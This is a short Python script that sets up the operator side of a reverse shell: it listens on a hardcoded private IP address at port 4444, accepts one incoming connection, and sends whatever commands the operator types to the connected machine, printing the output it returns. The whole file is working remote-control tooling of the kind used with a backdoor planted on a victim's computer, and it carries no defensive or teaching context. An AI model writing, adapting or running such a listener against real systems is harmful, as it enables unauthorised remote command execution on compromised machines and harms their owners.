import socket

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] listener started..")
        self.connection,address = listener.accept()
        print("[*] Got connection from" +str(address))
        
    def execute(self,command):
        self.connection.send(command.encode('utf-8')) #
        return self.connection.recv(1024)
     
    def run(self):
        while True:
           command = input("input >>")
           responsere = self.execute(command)
           print(responsere)

listener = Listener("192.168.242.56",4444)  
listener.run()